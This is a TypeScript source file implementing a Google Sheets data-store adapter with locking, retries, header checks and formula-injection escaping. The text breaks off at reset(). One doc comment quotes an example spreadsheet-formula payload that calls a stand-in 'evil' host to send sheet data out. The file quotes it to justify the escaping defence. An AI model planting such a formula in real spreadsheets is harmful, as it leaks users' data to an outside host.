/**
 * SheetsAdapter - Real Google Sheets DataStore implementation
 * Uses Google Apps Script SpreadsheetApp API
 */
import type {
  RowWithId,
  DataStore,
  QueryOptions,
  BatchUpdateItem,
  IdMode,
  UpdateData,
  AddColumnOptions
} from '../core/types'
import { evaluateCondition, compareRows } from '../core/query-utils'
import {
  CellSizeLimitError,
  DuplicateIdError,
  SchemaMismatchError,
  UnknownColumnError
} from '../core/errors'
import { withScriptLock } from '../core/script-lock'
import { withRetries } from '../core/gas-retry'

/** Column type definition for schema-based serialization */
export type ColumnType = 
  | 'string' 
  | 'number' 
  | 'boolean' 
  | 'date' 
  | 'string[]' 
  | 'number[]' 
  | 'object' 
  | 'json'

/**
 * Leading characters that make Sheets parse a written cell as a formula.
 * `setValue`/`setValues` parse their input the way a user typing into the UI
 * would, so '=' opens a formula, '+'/'-' open one for Lotus/Excel
 * compatibility, and '@' is the legacy function prefix. Tab and CR are
 * included because they are stripped before parsing, exposing whatever
 * follows them (the OWASP formula-injection set).
 */
const FORMULA_TRIGGER_CHARS = ['=', '+', '-', '@', '\t', '\r']

/** Prefix that forces Sheets to store a written cell as literal text. */
const TEXT_PREFIX = "'"

/**
 * Maximum characters Google Sheets stores in one cell.
 *
 * Enforced before any write (#136): the platform otherwise rejects the
 * oversized cell mid-`setValues`, which aborts a multi-row batch halfway and
 * leaves a partial update on the sheet.
 */
export const MAX_CELL_LENGTH = 50000

/** SheetsAdapter configuration options */
export interface SheetsAdapterOptions {
  /** Spreadsheet ID (optional - uses active spreadsheet if not provided) */
  spreadsheetId?: string
  /** Sheet name */
  sheetName: string
  /** Column names in order (first column should be 'id') */
  columns: string[]
  /** Whether to create sheet if it doesn't exist (default: true) */
  createIfNotExists?: boolean
  /**
   * ID column name (default: 'id')
   *
   * @deprecated 1.0 fixes the primary key at `'id'` (#101). SheetsAdapter is
   * the only layer that honors this — MockAdapter and LocalAdapter have no
   * such option, the CLI rejects a non-`id` `@id` field, and
   * `InferRowFromSchema` always types the row as `& { id }`. Setting it yields
   * rows whose declared type does not match their runtime shape. Custom
   * primary-key names are planned for a later release.
   */
  idColumn?: string
  /** 
   * ID generation mode (default: 'auto')
   * - 'auto': server generates numeric IDs (default, backward compatible)
   * - 'client': client provides IDs (UUID, string, etc.)
   */
  idMode?: IdMode
  /**
   * Column type definitions for schema-based serialization (optional)
   * If provided, enables type-aware serialization/deserialization
   * Example: { labels: 'string[]', metadata: 'object' }
   */
  columnTypes?: Record<string, ColumnType>
  /**
   * Write string values verbatim, so a value starting with '=' becomes a live
   * formula (default: false).
   *
   * The default escapes formula-opening characters, because any string that
   * reaches a cell unescaped is executed by Sheets — a user-supplied
   * `'=IMPORTXML("http://evil/","//x")'` would exfiltrate the sheet (#130).
   * Only enable this for stores whose values are authored by the script
   * itself and are meant to be formulas; never for user input.
   */
  allowFormulas?: boolean
  /**
   * Skip the per-execution header-drift check (default: false).
   *
   * By default every read and write path verifies once per execution that the
   * physical header row still agrees with {@link SheetsAdapterOptions.columns},
   * and throws {@link SchemaMismatchError} otherwise (#179). The check exists
   * because this adapter is positional: a column a collaborator inserts to the
   * left of an existing one shifts every value one place right, which
   * previously made reads return the neighbouring column's values and made
   * `update()` overwrite the human's column while leaving the real one stale —
   * silent data loss, confirmed on the live platform.
   *
   * Enable this only for sheets whose header row is deliberately not the
   * column list (a decorative or localized title row, a header the script does
   * not own). Doing so restores the old, dangerous behavior: misalignment is
   * silent again, and it is on the caller to keep the physical layout in the
   * declared order.
   *
   * Costs nothing to leave off: the check is a single 1×N read of row 1 per
   * execution, shared by every operation.
   */
  skipHeaderCheck?: boolean
}


/**
 * Google Sheets DataStore implementation
 * Provides CRUD operations on a single sheet
 *
 * ## Platform ceilings
 *
 * Sheets is not an unbounded store, and two of its limits are hard walls that
 * a growing table will eventually hit (#136):
 *
 * - **50,000 characters per cell.** Enforced: every serialized value is
 *   checked against {@link MAX_CELL_LENGTH} before any write, and a batch is
 *   validated in full before its first write, so an oversized value fails the
 *   whole operation instead of tearing it in half. See
 *   {@link CellSizeLimitError}.
 * - **10,000,000 cells per spreadsheet** (across all sheets; a sheet is also
 *   capped at 18,278 columns). Deliberately *not* enforced at runtime: the
 *   adapter would have to walk every sheet in the workbook on each write to
 *   know the current total, which costs more than it saves. Budget for it
 *   when sizing a table — `rows × columns` for this sheet is only its share.
 *   A workbook at the ceiling rejects writes at the platform level, which
 *   surfaces here as a {@link SheetsApiError}.
 *
 * ## Transient failures
 *
 * Sheets API calls that are safe to repeat (all reads, and `setValues` over a
 * fixed range) are retried with bounded backoff; calls that are not
 * idempotent (`appendRow`, `deleteRow`, `insertSheet`, `insertColumnBefore`,
 * `deleteColumn`) are attempted exactly once. See
 * {@link SheetsAdapter.sheetsCall}.
 */
export class SheetsAdapter<T extends RowWithId> implements DataStore<T> {
  private spreadsheetId?: string
  private sheetName: string
  private columns: string[]
  private idColumn: string
  private createIfNotExists: boolean
  private idMode: IdMode
  private columnTypes: Record<string, ColumnType>
  private allowFormulas: boolean
  private skipHeaderCheck: boolean

  // Sheet reference cache
  private _sheet: GoogleAppsScript.Spreadsheet.Sheet | null = null
  private _spreadsheet: GoogleAppsScript.Spreadsheet.Spreadsheet | null = null
  // Data cache - invalidated on write operations
  private _dataCache: T[] | null = null
  /**
   * Whether the physical header was already checked against the schema in this
   * execution (#179). Set only on success, so a drifted sheet keeps throwing.
   */
  private _headerVerified = false

  constructor(options: SheetsAdapterOptions) {
    this.spreadsheetId = options.spreadsheetId
    this.sheetName = options.sheetName
    this.columns = options.columns
    this.idColumn = options.idColumn || 'id'
    this.createIfNotExists = options.createIfNotExists ?? true
    this.idMode = options.idMode ?? 'auto'
    this.columnTypes = options.columnTypes ?? {}
    this.allowFormulas = options.allowFormulas ?? false
    this.skipHeaderCheck = options.skipHeaderCheck ?? false

    // Validate that id column is in columns
    if (!this.columns.includes(this.idColumn)) {
      throw new Error(`ID column '${this.idColumn}' must be included in columns`)
    }
  }

  /** Get the spreadsheet instance */
  /**
   * Drops the cached Spreadsheet handle and opens a fresh one.
   *
   * A handle's sheet list reflects the spreadsheet as of when the handle was
   * materialized; a sheet created by ANOTHER execution afterwards can be
   * invisible through the old handle even after that execution flushed
   * (#178, second live repro). Creation-path re-checks must read through a
   * fresh handle.
   */
  private reopenSpreadsheet(): GoogleAppsScript.Spreadsheet.Spreadsheet {
    this._spreadsheet = null
    return this.getSpreadsheet()
  }

  private getSpreadsheet(): GoogleAppsScript.Spreadsheet.Spreadsheet {
    if (!this._spreadsheet) {
      // Opening a document is a read, and one of the likeliest calls to hit a
      // transient backend timeout, so it is worth retrying (#136).
      const ss = this.sheetsCall(() => this.spreadsheetId
        ? SpreadsheetApp.openById(this.spreadsheetId)
        : SpreadsheetApp.getActiveSpreadsheet())
      if (!ss) {
        throw new Error(
          `No spreadsheet available for sheet '${this.sheetName}'. ` +
          'Bind this script to a Sheet, or pass spreadsheetId to SheetsAdapter, ' +
          'or set Script Property SPREADSHEET_ID.'
        )
      }
      this._spreadsheet = ss
    }
    return this._spreadsheet
  }

  /** Get the sheet instance, creating if necessary */
  private getSheet(): GoogleAppsScript.Spreadsheet.Sheet {
    if (!this._sheet) {
      const ss = this.getSpreadsheet()
      let sheet = this.sheetsCall(() => ss.getSheetByName(this.sheetName))

      if (!sheet) {
        if (this.createIfNotExists) {
          // Creation is a cross-execution critical section (#178): two
          // executions touching a not-yet-created table both see null above
          // and would both insertSheet — one throws on the taken name, and
          // the loser's early rows can be clobbered by the winner's header
          // write (acknowledged-row loss, observed on the live platform).
          //
          // The lock alone is not enough: a Spreadsheet handle materializes
          // its sheet list when opened, so even inside the lock a re-check
          // through a stale handle can miss a sheet another execution just
          // created (second live repro, gas-e2e run 31298880115). Hence the
          // fresh re-open before the re-check, and the adopt-on-failure
          // below as the final backstop — insertSheet's name-taken message
          // is localized, so recovery keys on "the sheet exists after all",
          // never on matching error text.
          sheet = this.withLock(() => {
            const fresh = this.reopenSpreadsheet()
            const existing = this.sheetsCall(() => fresh.getSheetByName(this.sheetName))
            if (existing) return existing
            try {
              // insertSheet is not idempotent — a retry after a spurious
              // failure would either create a second sheet or throw on the
              // taken name.
              const created = this.sheetsCallOnce(() => fresh.insertSheet(this.sheetName))
              // Write header row
              this.sheetsCall(() =>
                created.getRange(1, 1, 1, this.columns.length).setValues([this.columns])
              )
              return created
            } catch (err) {
              // A concurrent execution may have won a race even the fresh
              // read could not see. If the sheet exists now, adopt it;
              // otherwise the failure was real — rethrow it.
              const adopted = this.sheetsCall(() => this.reopenSpreadsheet().getSheetByName(this.sheetName))
              if (adopted) return adopted
              throw err
            }
          })
        } else {
          throw new Error(`Sheet '${this.sheetName}' not found`)
        }
      }

      this._sheet = sheet
    }
    return this._sheet
  }

  /** Clear all caches (sheet references and data) */
  clearCache(): void {
    this._sheet = null
    this._spreadsheet = null
    this._dataCache = null
    // The sheet may have been edited since the last check — re-arm the guard.
    this._headerVerified = false
  }

  /** Invalidate data cache (called after write operations) */
  private invalidateDataCache(): void {
    this._dataCache = null
  }

  /**
   * Assert, once per execution, that the physical header row still agrees with
   * the declared {@link SheetsAdapterOptions.columns} (#179).
   *
   * ## Why every operation calls this
   *
   * The adapter is positional: `rowToObject` maps cell *i* to `columns[i]` and
   * `objectToRow` writes back over columns 1..N. A collaborator who inserts a
   * column to the left of an existing one therefore shifts every value one
   * place right, and nothing downstream can tell. On the live platform that
   * produced a silent misread on every field right of the insert, and an
   * `update()` that overwrote the human's column while leaving the real
   * trailing column stale (gas-e2e run 31298563680). This converts both into a
   * loud, typed failure naming the column that drifted.
   *
   * ## Placement and cost
   *
   * Called at the top of every public data operation rather than from
   * {@link getSheet}, for two reasons: `addColumn` (and the physical schema ops
   * that follow it) legitimately runs against a header the schema has already
   * moved past and does its own, stricter validation, so it must not be
   * short-circuited here; and a guard tied to the sheet handle would be skipped
   * by any future path that resolves the sheet some other way.
   *
   * The `_headerVerified` flag makes the check cost **one 1×N read of row 1 per
   * execution**, no matter how many operations run — the flag is reset only by
   * {@link clearCache} (a new execution, or an explicit "re-read everything"),
   * never by {@link invalidateDataCache}, because a row write cannot move a
   * column. Folding the read into `findAll`'s bulk `getRange` (starting at row
   * 1 instead of row 2) would make it free for read-first executions, but a
   * write-only execution would still need its own header read, `_dataCache`
   * would have to carry a header slot, and the empty-sheet path (`lastRow <= 1`,
   * which reads nothing at all today) would need a second branch. One
   * single-row read, shared by every entry point, is the simpler contract.
   *
   * ## What counts as drift
   *
   * Only the first `columns.length` header cells are read, and a position
   * counts as diverging only when the sheet has a non-empty header there that
   * differs from the declared name. So:
   * - a header that is a **prefix** of the schema (a sheet not yet migrated by
   *   `addColumn`) passes — the mapping is still aligned;
   * - extra physical columns to the **right** of the schema pass — they are
   *   never read and never written;
   * - a sheet with no header row at all passes — nothing to contradict;
   * - an inserted, renamed or reordered column fails at its position.
   *
   * @throws {SchemaMismatchError} the header contradicts the declared columns
   */
  private assertHeaderAligned(): void {
    if (this.skipHeaderCheck || this._headerVerified) return

    const sheet = this.getSheet()
    const cells = this.sheetsCall(() =>
      sheet.getRange(1, 1, 1, this.columns.length).getValues()
    )[0]
    const header = cells.map(value => (isEmptyCellValue(value) ? '' : String(value)))

    for (let i = 0; i < this.columns.length; i++) {
      const found = header[i]
      if (found === '' || found === this.columns[i]) continue
      throw new SchemaMismatchError(
        this.sheetName,
        header,
        [...this.columns],
        `Header column ${i + 1} (${toColumnLetter(i)}) expected "${this.columns[i]}" but found ` +
        `"${found}", so every value from that column on is read and written one place off. ` +
        'A column may have been inserted/renamed/reordered in the sheet — align the sheet or ' +
        'the schema. If this fired right after a migration, the value-level renameColumn ' +
        'never updated the physical header (see #180). To accept the misalignment anyway, ' +
        'construct the adapter with skipHeaderCheck: true.'
      )
    }

    this._headerVerified = true
  }

  /**
   * Prefix a string that Sheets would otherwise parse as a formula with the
   * plain-text marker, so it is stored as the literal text it is (#130).
   *
   * A value already starting with the marker is escaped too, so it survives
   * the round trip instead of losing its first character to the parser.
   * Non-strings are returned untouched — numbers, booleans and Dates cannot
   * open a formula.
   */
  private escapeCellValue(value: unknown): unknown {
    if (this.allowFormulas) return value
    if (typeof value !== 'string' || value.length === 0) return value

    const first = value.charAt(0)
    if (first === TEXT_PREFIX || FORMULA_TRIGGER_CHARS.indexOf(first) !== -1) {
      return TEXT_PREFIX + value
    }
    return value
  }

  /**
   * Inverse of {@link escapeCellValue}.
   *
   * Real Sheets consumes the marker while parsing the write, so escaped cells
   * usually come back already unescaped and this is a no-op. Stores that keep
   * the written text verbatim (the testing fakes, a cell pre-formatted as
   * plain text, an imported CSV) hand the marker back, and it is dropped here.
   * The marker is only honored in front of a character that would have needed
   * escaping, so an apostrophe belonging to the data (`"'quoted"`) is kept.
   */
  private unescapeCellValue(value: unknown): unknown {
    if (this.allowFormulas) return value
    if (typeof value !== 'string' || value.length < 2) return value
    if (value.charAt(0) !== TEXT_PREFIX) return value

    const next = value.charAt(1)
    if (next === TEXT_PREFIX || FORMULA_TRIGGER_CHARS.indexOf(next) !== -1) {
      return value.slice(1)
    }
    return value
  }

  /**
   * Convert sheet row (array) to object
   * Uses schema-based types if available, falls back to auto-detection
   */
  private rowToObject(values: unknown[]): T {
    const obj: Record<string, unknown> = {}
    for (let i = 0; i < this.columns.length; i++) {
      const col = this.columns[i]
      let value = this.unescapeCellValue(values[i])
      const colType = this.columnTypes[col]

      // Normalize GAS Dates to ISO strings for consistency — except for
      // date-typed columns, which deserialize back to a real Date below
      // (skip the wasteful Date -> string -> Date round trip).
      if (value instanceof Date && colType !== 'date') {
        value = value.toISOString()
      }

      // Schema-based deserialization
      if (colType) {
        value = this.deserializeByType(value, colType)
      } else {
        // Auto-detect: try to parse JSON strings (arrays and objects)
        if (typeof value === 'string' && value.length > 0) {
          const trimmed = value.trim()
          if ((trimmed.startsWith('[') && trimmed.endsWith(']')) ||
              (trimmed.startsWith('{') && trimmed.endsWith('}'))) {
            try {
              value = JSON.parse(trimmed)
            } catch {
              // Keep as string if parsing fails
            }
          }
        }
      }
      
      obj[col] = value
    }
    return obj as T
  }

  /** Deserialize value based on column type */
  private deserializeByType(value: unknown, colType: ColumnType): unknown {
    if (value === '' || value === null || value === undefined) {
      // Return appropriate empty value for type
      if (colType === 'string[]' || colType === 'number[]') return []
      if (colType === 'object' || colType === 'json') return null
      if (colType === 'boolean') return false
      if (colType === 'number') return 0
      return value
    }

    switch (colType) {
      case 'string[]':
      case 'number[]':
      case 'object':
      case 'json':
        if (typeof value === 'string') {
          try {
            return JSON.parse(value)
          } catch {
            return colType.endsWith('[]') ? [] : null
          }
        }
        return value
      case 'boolean':
        if (typeof value === 'string') {
          return value.toLowerCase() === 'true'
        }
        return Boolean(value)
      case 'number':
        return Number(value)
      case 'date': {
        // Date columns deserialize to a real Date so the runtime value matches
        // the generated `Date` type (#97). rowToObject may have pre-converted a
        // GAS Date to an ISO string, so parse strings/numbers back to a Date.
        if (value instanceof Date) return value
        if (typeof value === 'string' || typeof value === 'number') {
          const parsed = new Date(value)
          if (!isNaN(parsed.getTime())) return parsed
        }
        return value
      }
      default:
        return value
    }
  }

  /**
   * Convert object to sheet row (array)
   * Uses schema-based types if available, falls back to auto-detection
   */
  private objectToRow(obj: Partial<T>): unknown[] {
    return this.columns.map(col => this.serializeCell(col, obj[col as keyof T]))
  }

  /**
   * Convert a single value to its sheet cell representation.
   * Shared by objectToRow and the addColumn default backfill so a default is
   * written exactly as the same value would be written through a row write —
   * including formula-injection escaping (#130), so no user-supplied string
   * can reach the sheet as a live formula through either path.
   *
   * This is also the single choke point for the 50,000-character cell limit
   * (#136): every write path serializes its whole payload here before issuing
   * any Sheets call, so an oversized value fails the operation as a whole
   * instead of aborting a batch halfway through.
   *
   * @throws {CellSizeLimitError} the serialized value exceeds {@link MAX_CELL_LENGTH}
   */
  private serializeCell(column: string, value: unknown): unknown {
    const colType = this.columnTypes[column]

    // Convert undefined/null to empty string for Sheets
    if (value === undefined || value === null) return ''

    let serialized: unknown
    if (colType) {
      // Schema-based serialization
      serialized = this.serializeByType(value, colType)
    } else if (Array.isArray(value)) {
      // Auto-detect: serialize arrays and objects to JSON
      serialized = JSON.stringify(value)
    } else if (typeof value === 'object' && !(value instanceof Date)) {
      serialized = JSON.stringify(value)
    } else {
      serialized = value
    }

    // Measured after escaping, because the text marker is part of what the
    // cell has to hold. Only strings can overflow — a number, boolean or Date
    // has no length to speak of.
    const cell = this.escapeCellValue(serialized)
    if (typeof cell === 'string' && cell.length > MAX_CELL_LENGTH) {
      throw new CellSizeLimitError(column, cell.length, MAX_CELL_LENGTH, this.sheetName)
    }

    return cell
  }

  /** Serialize value based on column type */
  private serializeByType(value: unknown, colType: ColumnType): unknown {
    switch (colType) {
      case 'string[]':
      case 'number[]':
        if (Array.isArray(value)) return JSON.stringify(value)
        return '[]'
      case 'object':
      case 'json':
        if (typeof value === 'object' && value !== null) {
          return JSON.stringify(value)
        }
        return ''
      case 'boolean':
        return value ? 'TRUE' : 'FALSE'
      case 'date':
        if (value instanceof Date) return value.toISOString()
        return value
      default:
        return value
    }
  }

  /**
   * Run a function while holding the script lock (when LockService is available).
   * The lock is held for the entire duration of fn so that read-allocate-write
   * and find-then-write sequences stay atomic across concurrent executions
   * (#80, #128). Degrades to running fn unlocked outside GAS.
   */
  private withLock<R>(fn: () => R): R {
    return withScriptLock(fn)
  }

  /**
   * Run one **idempotent** Sheets API call with bounded retry (#136).
   *
   * Use for reads and for `setValues` over a range whose coordinates were
   * computed before the call: repeating either writes the same cells with the
   * same values, so a repeat after a spurious failure is indistinguishable
   * from the first attempt having worked.
   *
   * Placement is per call, not per public method. Wrapping a whole locked
   * method would re-run its read-then-write sequence — including the id
   * allocation — which is exactly the race the lock exists to prevent.
   *
   * Trade-off: because these calls sit inside the script lock, a retry sleeps
   * while holding it. That is accepted and bounded — 1.5s worst case per
   * guarded call with the defaults. It is not bounded *per operation*: a
   * scattered `batchUpdate` retries once per contiguous run, so a sustained
   * quota storm can stretch the lock hold. The per-operation deadline guard
   * is the other half of #136.
   */
  private sheetsCall<R>(fn: () => R): R {
    return withRetries(fn)
  }

  /**
   * Run one **non-idempotent** Sheets API call: classify its failure, never
   * repeat it (#136).
   *
   * `appendRow`, `deleteRow`, `insertSheet`, `insertColumnBefore` and
   * `deleteColumn` change the sheet's shape. A timeout from one of them does
   * not say whether the mutation landed, so retrying risks a second append (in
   * auto id mode, a duplicate row under a duplicate id), a second deleted row,
   * or a second deleted column. Losing the operation is recoverable; silently
   * doubling it is not.
   */
  private sheetsCallOnce<R>(fn: () => R): R {
    return withRetries(fn, { attempts: 1 })
  }

  /**
   * Read the id of a client-mode row, throwing when the caller omitted it.
   */
  private requireClientId(data: Omit<T, 'id'> | T): string | number {
    const record = data as Record<string, unknown>
    if (!(this.idColumn in record)) {
      throw new Error(`ID is required in client mode (idMode: 'client')`)
    }
    return record[this.idColumn] as string | number
  }

  /** Read every id currently on the sheet, keyed as strings for comparison. */
  private readExistingIdKeys(): Set<string> {
    const sheet = this.getSheet()
    const lastRow = sheet.getLastRow()
    const keys = new Set<string>()

    if (lastRow <= 1) return keys

    const idColIndex = this.columns.indexOf(this.idColumn) + 1
    const ids = this.sheetsCall(() =>
      sheet.getRange(2, idColIndex, lastRow - 1, 1).getValues()
    ).flat()
    for (const id of ids) {
      if (id === '' || id === null || id === undefined) continue
      keys.add(String(id))
    }
    return keys
  }

  /**
   * Reject client-supplied ids that already exist on the sheet, or that repeat
   * within the same batch. Must be called inside withLock() together with the
   * write, otherwise a concurrent execution can insert the same id in between.
   */
  private assertClientIdsAvailable(ids: (string | number)[]): void {
    const existing = this.readExistingIdKeys()
    for (const id of ids) {
      const key = String(id)
      if (existing.has(key)) {
        throw new DuplicateIdError(id, this.sheetName)
      }
      existing.add(key)
    }
  }

  /**
   * Get the next available ID by scanning the current max.
   * Must be called inside withLock() together with the row write so that
   * ID allocation and the write are atomic.
   */
  private getNextId(): number {
    return this.readMaxId() + 1
  }

  /** Read the current max ID from the sheet */
  private readMaxId(): number {
    const sheet = this.getSheet()
    const lastRow = sheet.getLastRow()

    if (lastRow <= 1) return 0

    const idColIndex = this.columns.indexOf(this.idColumn) + 1
    const idRange = sheet.getRange(2, idColIndex, lastRow - 1, 1)
    const ids = this.sheetsCall(() => idRange.getValues())
      .flat()
      .filter(id => typeof id === 'number' && !isNaN(id))

    if (ids.length === 0) return 0
    return Math.max(...ids as number[])
  }

  /** Find row index by ID (1-indexed, returns -1 if not found) */
  private findRowIndexById(id: string | number): number {
    const sheet = this.getSheet()
    const lastRow = sheet.getLastRow()
    
    if (lastRow <= 1) return -1
    
    const idColIndex = this.columns.indexOf(this.idColumn) + 1
    const idRange = sheet.getRange(2, idColIndex, lastRow - 1, 1)
    // Unescape so a stored id keeps matching the id the caller passes (#130).
    const ids = this.sheetsCall(() => idRange.getValues())
      .flat()
      .map(rowId => this.unescapeCellValue(rowId))

    // Support both string and number comparison
    const rowOffset = ids.findIndex(rowId => rowId === id || String(rowId) === String(id))
    return rowOffset === -1 ? -1 : rowOffset + 2 // +2 for header row and 1-indexing
  }

  findAll(): T[] {
    this.assertHeaderAligned()

    if (this._dataCache !== null) {
      return [...this._dataCache]
    }

    const sheet = this.getSheet()
    const lastRow = sheet.getLastRow()

    if (lastRow <= 1) {
      this._dataCache = []
      return []
    }

    const dataRange = sheet.getRange(2, 1, lastRow - 1, this.columns.length)
    const values = this.sheetsCall(() => dataRange.getValues())

    this._dataCache = values
      .filter(row => row.some(cell => cell !== ''))
      .map(row => this.rowToObject(row))

    return [...this._dataCache]
  }

  findById(id: string | number): T | undefined {
    this.assertHeaderAligned()

    const rowIndex = this.findRowIndexById(id)
    if (rowIndex === -1) return undefined
    
    const sheet = this.getSheet()
    const values = this.sheetsCall(() =>
      sheet.getRange(rowIndex, 1, 1, this.columns.length).getValues()
    )[0]
    return this.rowToObject(values)
  }

  find(options: QueryOptions<T>): T[] {
    this.assertHeaderAligned()

    // Get all data first (GAS doesn't support SQL-like queries)
    let result = this.findAll()
    
    // Apply where conditions
    if (options.where.length > 0) {
      result = result.filter(row =>
        options.where.every(condition => evaluateCondition(row, condition))
      )
    }
    
    // Apply ordering
    if (options.orderBy.length > 0) {
      result.sort((a, b) => compareRows(a, b, options.orderBy))
    }
    
    // Apply offset
    if (options.offsetValue !== undefined && options.offsetValue > 0) {
      result = result.slice(options.offsetValue)
    }
    
    // Apply limit
    if (options.limitValue !== undefined && options.limitValue >= 0) {
      result = result.slice(0, options.limitValue)
    }
    
    return result
  }

  insert(data: Omit<T, 'id'> | T): T {
    this.assertHeaderAligned()
    this.invalidateDataCache()
    const sheet = this.getSheet()

    if (this.idMode === 'client') {
      // Client mode: use client-provided ID. The uniqueness check and the write
      // share one lock so a concurrent execution cannot slip in the same id
      // between them, which would leave a row unreachable by id (#128).
      const id = this.requireClientId(data)
      return this.withLock(() => {
        this.assertClientIdsAvailable([id])
        const newRow = data as T
        const rowValues = this.objectToRow(newRow)
        this.sheetsCallOnce(() => sheet.appendRow(rowValues))
        return newRow
      })
    } else {
      // Auto mode: allocate the ID and write the row atomically under the lock,
      // otherwise concurrent executions can allocate the same ID.
      return this.withLock(() => {
        const id = this.getNextId()
        const newRow = { ...data, [this.idColumn]: id } as T
        const rowValues = this.objectToRow(newRow)
        this.sheetsCallOnce(() => sheet.appendRow(rowValues))
        return newRow
      })
    }
  }

  update(id: string | number, data: UpdateData<T>): T | undefined {
    this.assertHeaderAligned()
    const sheet = this.getSheet()

    // Locating the row and writing to that row number must be atomic: a
    // concurrent deleteRow above the target shifts rows up and the write would
    // land on a different record (#128).
    return this.withLock(() => {
      const rowIndex = this.findRowIndexById(id)
      if (rowIndex === -1) return undefined

      this.invalidateDataCache()
      const currentValues = this.sheetsCall(() =>
        sheet.getRange(rowIndex, 1, 1, this.columns.length).getValues()
      )[0]

      // Cheap re-verification of the row we are about to overwrite — free here
      // because the row was read anyway, and it still guards the unlocked
      // (LockService-less) path.
      const currentId = this.unescapeCellValue(currentValues[this.columns.indexOf(this.idColumn)])
      if (currentId !== id && String(currentId) !== String(id)) return undefined

      const currentRow = this.rowToObject(currentValues)

      const updatedRow = { ...currentRow, ...data } as T
      // id is immutable via update; ignore any attempt to change it (#98).
      ;(updatedRow as Record<string, unknown>)[this.idColumn] =
        (currentRow as Record<string, unknown>)[this.idColumn]
      const rowValues = this.objectToRow(updatedRow)

      // Fixed range, fixed values: repeating this write is a no-op, so it is
      // safe to retry through a transient backend failure (#136).
      this.sheetsCall(() =>
        sheet.getRange(rowIndex, 1, 1, this.columns.length).setValues([rowValues])
      )

      return updatedRow
    })
  }

  delete(id: string | number): boolean {
    this.assertHeaderAligned()
    const sheet = this.getSheet()

    // Same find-then-write race as update(): without the lock a concurrent
    // delete above the target makes this remove the wrong row (#128).
    return this.withLock(() => {
      const rowIndex = this.findRowIndexById(id)
      if (rowIndex === -1) return false

      this.invalidateDataCache()
      // deleteRow shifts every row below it up, so a repeat after a spurious
      // failure removes a second, innocent row. Attempt it exactly once.
      this.sheetsCallOnce(() => sheet.deleteRow(rowIndex))

      return true
    })
  }

  batchInsert(items: (Omit<T, 'id'> | T)[]): T[] {
    if (items.length === 0) return []

    this.assertHeaderAligned()
    this.invalidateDataCache()
    const sheet = this.getSheet()

    // Batch write all rows at once, appending after the current last row.
    const writeRows = (rows: unknown[][]) => {
      const lastRow = sheet.getLastRow()
      // The range is pinned before the call, so retrying rewrites the same
      // cells rather than appending a second copy of the batch (#136).
      this.sheetsCall(() =>
        sheet.getRange(lastRow + 1, 1, rows.length, this.columns.length).setValues(rows)
      )
    }

    if (this.idMode === 'client') {
      // Client mode: no server-side allocation, but the write position
      // (getLastRow) and the uniqueness check are still read-then-write, so
      // they belong inside the lock — two concurrent batches otherwise compute
      // the same start row and the second overwrites the first (#128).
      const results: T[] = []
      const rowsToInsert: unknown[][] = []
      const ids: (string | number)[] = []
      for (const data of items) {
        ids.push(this.requireClientId(data))
        const newRow = data as T
        results.push(newRow)
        rowsToInsert.push(this.objectToRow(newRow))
      }
      return this.withLock(() => {
        this.assertClientIdsAvailable(ids)
        writeRows(rowsToInsert)
        return results
      })
    }

    // Auto mode: allocate IDs (incl. the getLastRow used for the write
    // position) and write atomically under the lock to avoid duplicate IDs.
    return this.withLock(() => {
      const results: T[] = []
      const rowsToInsert: unknown[][] = []
      let nextId = this.getNextId()
      for (const data of items) {
        const newRow = { ...data, [this.idColumn]: nextId } as T
        results.push(newRow)
        rowsToInsert.push(this.objectToRow(newRow))
        nextId++
      }
      writeRows(rowsToInsert)
      return results
    })
  }

  batchUpdate(items: BatchUpdateItem<T>[]): T[] {
    if (items.length === 0) return []

    this.assertHeaderAligned()
    this.invalidateDataCache()
    const sheet = this.getSheet()

    // Build a map of id -> data for batch processing
    const updateMap = new Map<string | number, Partial<Omit<T, 'id'>>>()
    for (const { id, data } of items) {
      updateMap.set(id, data)
    }

    // Read, resolve row indices and write inside one lock. The row numbers
    // below are positions within the block read at the top, so a concurrent
    // deleteRow or insert landing in between shifts them and the ranged writes
    // hit the wrong rows — the stale-index race of #128, amplified because
    // writeRowRuns rewrites a whole contiguous span at once (#155).
    // withScriptLock is re-entrant, so callers already holding the lock (a
    // migration delegating to batchUpdate) reuse their acquisition.
    return this.withLock(() => {
      const results: T[] = []

      // Get all data to find rows to update
      const lastRow = sheet.getLastRow()
      if (lastRow <= 1) return results

      const allData = sheet.getRange(2, 1, lastRow - 1, this.columns.length).getValues()
      const idColIndex = this.columns.indexOf(this.idColumn)

      const updatedRows: { rowIndex: number; values: unknown[] }[] = []

      for (let i = 0; i < allData.length; i++) {
        // Unescape so an escaped id still matches the caller's id (#130).
        const rowId = this.unescapeCellValue(allData[i][idColIndex]) as string | number
        const updateData = updateMap.get(rowId) ?? updateMap.get(String(rowId))

        if (updateData) {
          const currentRow = this.rowToObject(allData[i])
          const updatedRow = { ...currentRow, ...updateData } as T
          // id is immutable via batchUpdate too — mirrors the guard update()
          // already has (#98/#113). Without this, `data` carrying an id rewrites
          // the key cell and the row becomes reachable only at its new id.
          ;(updatedRow as Record<string, unknown>)[this.idColumn] =
            (currentRow as Record<string, unknown>)[this.idColumn]
          results.push(updatedRow)
          updatedRows.push({
            rowIndex: i + 2, // +2 for header and 1-indexing
            values: this.objectToRow(updatedRow)
          })
        }
      }

      this.writeRowRuns(sheet, updatedRows)

      return results
    })
  }

  /**
   * Writes serialized rows, coalescing consecutive sheet rows into a single
   * `setValues` call — one write per contiguous run instead of one per row
   * (#129), so a 1,000-row contiguous batch costs 1 write instead of 1,000.
   * The old per-row loop could exhaust the 6-minute execution budget mid-batch
   * and leave a silent partial update.
   *
   * Rows that were not updated are never included in a range, even when that
   * would merge two runs: rewriting a clean row would write back the value
   * read at the start of the call (clobbering a concurrent writer) and would
   * replace any formula in it with its computed value. Scattered updates
   * therefore still cost one write per dirty row — correctness over quota.
   *
   * `rows` must be sorted ascending by `rowIndex`; batchUpdate builds it in
   * sheet order.
   */
  private writeRowRuns(
    sheet: GoogleAppsScript.Spreadsheet.Sheet,
    rows: { rowIndex: number; values: unknown[] }[]
  ): void {
    if (rows.length === 0) return

    let runStart = 0
    for (let i = 1; i <= rows.length; i++) {
      const endOfRun = i === rows.length || rows[i].rowIndex !== rows[i - 1].rowIndex + 1
      if (!endOfRun) continue

      const run = rows.slice(runStart, i)
      // Each run is an idempotent fixed-range write, so it is retried
      // individually rather than re-running the whole batch (#136).
      this.sheetsCall(() =>
        sheet
          .getRange(run[0].rowIndex, 1, run.length, this.columns.length)
          .setValues(run.map(({ values }) => values))
      )
      runStart = i
    }
  }

  reset(data: T[] = []): void {
